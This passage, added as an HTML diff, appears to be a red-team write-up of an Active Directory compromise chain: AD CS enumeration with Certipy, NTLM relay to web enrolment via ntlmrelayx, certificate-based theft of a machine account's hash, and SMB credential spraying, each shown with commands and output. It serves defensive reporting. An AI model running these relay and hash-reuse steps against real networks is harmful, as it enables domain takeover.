@@ -1,0 +1,99 @@
+<h2>Attack path summary</h2>
+<p>The route to Domain Admin did not rely on a single vulnerability. It  relied on several issues being present at the same time: AD CS relay  exposure, machine-account privilege, local administrative access, local  Administrator credential reuse, an active Domain Admin session on a  compromised host, and sufficient local privileges to duplicate that  user’s token.</p>
+<p>The attack path followed this sequence:</p>
+<figure class="article-figure">
+  <img id="attack-path-img" alt="Attack path from low-privileged domain credentials through AD CS abuse, host compromise, credential reuse and token impersonation to Domain Admin">
+  <figcaption>Attack path to Domain Admin.</figcaption>
+</figure>
+
+<h2>What was the initial foothold for this Advanced Threat Simulation?</h2>
+<p>The initial position for this phase was a valid low-privileged domain  account. This represented an internal foothold and allowed standard  domain enumeration to begin. The account did not have administrative  privileges at the start of the chain.</p>
+<p><code>certipy-ad find \</code>
+<code> -u standard.user@example-corp.local \</code>
+<code> -p 'ExamplePassword!123' \</code>
+<code> -dc-ip 10.10.20.83</code></p>
+<p>The enumeration confirmed that Active Directory Certificate Services was deployed in the domain.</p>
+<p><code> Certipy v5.0.3</code>
+<code> [*] Finding certificate templates</code>
+<code> [*] Found 34 certificate templates</code>
+<code> [*] Finding certificate authorities</code>
+<code> [*] Found 4 certificate authorities</code>
+<code> [*] Found 35 enabled certificate templates</code>
+<code> [*] Finding issuance policies</code>
+<code> [*] Found 1 issuance policies </code></p>
+<p>This was a useful early indicator. AD CS is often part of the  authentication fabric of an Active Directory environment, and  certificate issuance paths can become privilege escalation paths when  enrolment permissions, web enrolment, NTLM relay, or template  configuration are weak.</p>
+<h2>How was Active Directory Certificate Services (AD CS) identified as vulnerable?</h2>
+<p>A targeted AD CS vulnerability check was then performed.</p>
+<p><code>certipy-ad find -u standard.user@example-corp.local -p 'ExamplePassword!123' -dc-ip 10.10.20.83 -vulnerable</code></p>
+<p>The vulnerable-template output did not directly identify a simple  exploitable template. The broader enumeration output was therefore  reviewed to understand certificate authority configuration, enrolment  permissions, and whether web enrolment was enabled.</p>
+<p>The relevant certificate authority output showed that web enrolment was enabled on the certificate authority.</p>
+<pre><code>{
+  &quot;Certificate Authorities&quot;: {
+    &quot;0&quot;: {
+      &quot;CA Name&quot;: &quot;DC-03-CA&quot;,
+      &quot;DNS Name&quot;: &quot;DC-03.example-corp.local&quot;,
+      &quot;Certificate Subject&quot;: &quot;CN=DC-03-CA, DC=example-corp, DC=local&quot;,
+      &quot;Certificate Serial Number&quot;: &quot;ABCDEF22000000000146&quot;,
+      &quot;Web Enrollment&quot;: {
+        &quot;http&quot;: {
+          &quot;enabled&quot;: true
+        }
+      },
+      &quot;[+] User Enrollable Principals&quot;: [
+        &quot;EXAMPLE-CORP.LOCAL\\Authenticated Users&quot;,
+        &quot;EXAMPLE-CORP.LOCAL\\Domain Users&quot;
+      ]
+    }
+  }
+}
+</code></pre>
+<p>This changed the direction of the assessment. The issue was not a  single certificate template that immediately granted elevated access.  The relevant exposure was that AD CS web enrolment could be targeted  during NTLM relay activity. Where NTLM relay protections are not  enforced, an attacker may be able to relay authentication to the  certificate authority and request a certificate on behalf of the relayed  principal.</p>
+<h2>How does NTLM relay exploitation work against AD CS web enrollment?</h2>
+<p>The AD CS web enrolment endpoint was then targeted for relay-based  certificate issuance. The objective was to obtain certificate-based  authentication material for a relayed machine account.</p>
+<pre><code>ntlmrelayx.py -t http://DC-03.example-corp.local/certsrv/certfnsh.asp --adcs --template User -smb2support
+</code></pre>
+<p>A relayed authentication was received from the <code>SRV-SCCM-01$</code> machine account. The certificate authority issued a certificate for that account and wrote the resulting PKCS#12 file to disk.</p>
+<p><code>[*] Running in relay mode to single host</code>
+<code> [*] Setting up SMB Server on port 445</code>
+<code> [*] Setting up HTTP Server on port 80</code>
+<code> [*] Servers started, waiting for connections</code></p>
+<p><code>[*] GOT CERTIFICATE! ID 1</code>
+<code> [*] Writing PKCS#12 certificate to ./SRV-SCCM-01$.pfx</code>
+<code> [*] Certificate successfully written to file</code></p>
+<p>This was the first material escalation in the chain. A relayed  authentication event had been converted into reusable authentication  material for a domain-joined machine account.</p>
+<h2>How was certificate-based authentication used for machine account compromise?</h2>
+<p>The issued certificate was then used to authenticate as <code>SRV-SCCM-01$</code>.</p>
+<p><code>certipy-ad auth -pfx 'SRV-SCCM-01$.pfx' -dc-ip 10.10.20.83</code></p>
+<p>The authentication succeeded. A Kerberos credential cache was written and the NT hash for the machine account was retrieved.</p>
+<p><code>[*] Certificate identities:</code>
+<code> [*] SAN UPN: 'SRV-SCCM-01$@example-corp.local'</code>
+<code> [*] Using principal: 'srv-sccm-01$@example-corp.local'</code>
+<code> [*] Trying to get TGT...</code>
+<code> [*] Got TGT</code>
+<code> [*] Saving credential cache to 'srv-sccm-01.ccache'</code>
+<code> [*] Wrote credential cache to 'srv-sccm-01.ccache'</code>
+<code> [*] Trying to retrieve NT hash for 'srv-sccm-01$'</code>
+<code> [*] Got hash for 'srv-sccm-01$@example-corp.local': aad3b435b51404eeaad3b435b51404ee:11111111111111111111111111111111</code></p>
+<p>At this stage, the assessment had progressed from low-privileged  domain credentials to authenticated access as a domain-joined machine  account. This was not yet Domain Admin access, but it provided a route  into a management server.</p>
+<h2>Validating administrative access with the machine account</h2>
+<p>The machine-account hash was then tested against SMB across the internal subnet.</p>
+<p><code>nxc smb 10.10.20.0/24 -d example-corp.local -u 'SRV-SCCM-01$' -H '11111111111111111111111111111111'</code></p>
+<p>The output showed administrative access to <code>SRV-SCCM-01</code> .</p>
+<p><code>SMB 10.10.20.70 445 SRV-SCCM-01 [+] example-corp.local\SRV-SCCM-01$:11111111111111111111111111111111 (Pwn3d!)</code></p>
+<p>This confirmed that the recovered machine-account hash could be used  to obtain local administrative access to the host. The next step was to  establish remote command execution and validate the local privilege  level.</p>
+<p>Remote PowerShell execution on SRV-SCCM-01</p>
+<p>A session was established against <code>SRV-SCCM-01</code> using the machine-account hash. The session confirmed execution under the machine-account context.</p>
+<p><code>PS C:\Users\SRV-SCCM-01$\Documents&gt; whoami</code>
+<code> example-corp\srv-sccm-01$</code></p>
+<p>Privilege and group enumeration showed that the session had local administrative rights on the host.</p>
+<pre><code>whoami /priv
+whoami /groups
+</code></pre>
+<p>The output included high-impact local privileges and membership in the local Administrators group.</p>
+<pre><code>SeBackupPrivilege        Back up files and directories        Enabled
+SeRestorePrivilege       Restore files and directories        Enabled
+SeDebugPrivilege         Debug programs                       Enabled
+SeImpersonatePrivilege   Impersonate a client after authentication Enabled
+
+BUILTIN\Administrators   Alias   S-1-5-32-544   Mandatory group, Enabled by default, Enabled group, Group owner
+EXAMPLE-CORP\MANAGEMENT_SERVERS Group S-1-5-21-1111111111-2222222222-3333333333-25474 Mandatory group, Enabled by default, Ena
